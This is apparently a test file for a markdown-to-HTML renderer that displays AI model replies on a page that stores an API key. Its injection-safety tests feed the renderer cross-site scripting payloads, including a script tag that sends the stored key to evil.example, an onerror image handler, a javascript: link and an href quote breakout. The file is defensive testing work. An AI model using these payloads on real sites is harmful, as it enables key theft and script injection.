// Tests for site/markdown.js. Model replies are untrusted text rendered as HTML
// on a page whose localStorage holds an API key (ADR-0002) — an injection here
// is a key leak. These tests pin the escape-first contract.
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { renderMarkdown } from '../site/markdown.js';

describe('injection safety', () => {
  test('raw HTML in a reply is shown as text, never as tags', () => {
    const html = renderMarkdown('<script>fetch("https://evil.example/?k="+localStorage.getItem("harness:v1:key"))</script>');
    assert.equal(html.includes('<script'), false);
    assert.match(html, /&lt;script&gt;/);
  });

  test('event-handler attributes cannot sneak in through images or bold text', () => {
    const html = renderMarkdown('**<img src=x onerror=alert(1)>**');
    assert.equal(html.includes('<img'), false);
    assert.match(html, /<strong>&lt;img src=x onerror=alert\(1\)&gt;<\/strong>/);
  });

  test('javascript: links are not turned into anchors', () => {
    const html = renderMarkdown('[click me](javascript:alert(1))');
    assert.equal(html.includes('<a '), false);
  });

  test('a quote in a link URL cannot break out of the href attribute', () => {
    const html = renderMarkdown('[x](https://ok.example/"onmouseover="alert(1))');
    // the quote must arrive escaped, so the whole payload stays inside href's value
    assert.equal(html.includes('"onmouseover'), false);
    assert.match(html, /href="https:\/\/ok\.example\/&quot;onmouseover=&quot;alert\(1" target="_blank"/);
  });

  test('HTML inside code blocks and code spans stays escaped', () => {
    const html = renderMarkdown('```html\n<b>hi</b>\n```\nand `<i>x</i>`');
    assert.equal(html.includes('<b>'), false);
    assert.equal(html.includes('<i>'), false);
    assert.match(html, /<pre><code data-lang="html">&lt;b&gt;hi&lt;\/b&gt;<\/code><\/pre>/);
  });
});

describe('formatting a typical reply', () => {
  test('paragraphs, lists, headings, bold, links and code', () => {
    const html = renderMarkdown('# Plan\n\nDo **this** first:\n\n- one\n- two\n\nSee [docs](https://openrouter.ai/docs) and `npm test`.');
    assert.equal(
      html,
      [
        '<h1>Plan</h1>',
        '<p>Do <strong>this</strong> first:</p>',
        '<ul><li>one</li><li>two</li></ul>',
        '<p>See <a href="https://openrouter.ai/docs" target="_blank" rel="noopener noreferrer">docs</a> and <code>npm test</code>.</p>',
      ].join('\n'),
    );
  });

  test('formatting markers inside code spans are left alone', () => {
    assert.equal(renderMarkdown('`a **b** c`'), '<p><code>a **b** c</code></p>');
  });

  test('an unclosed code fence (reply still streaming) renders as code so far', () => {
    assert.equal(renderMarkdown('```js\nconst a = 1;'), '<pre><code data-lang="js">const a = 1;</code></pre>');
  });

  test('numbered lists render as ordered lists', () => {
    assert.equal(renderMarkdown('1. first\n2. second'), '<ol><li>first</li><li>second</li></ol>');
  });
});
